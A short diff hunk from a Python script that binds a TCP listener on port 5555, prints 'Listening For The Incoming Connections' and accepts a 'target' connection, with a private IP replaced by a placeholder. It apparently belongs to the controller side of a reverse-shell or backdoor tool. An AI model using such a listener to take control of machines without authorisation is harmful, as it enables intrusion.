@@ -99,7 +99,7 @@ print("""
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.10.116', 5555))
+sock.bind(('ip address', 5555))
 print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
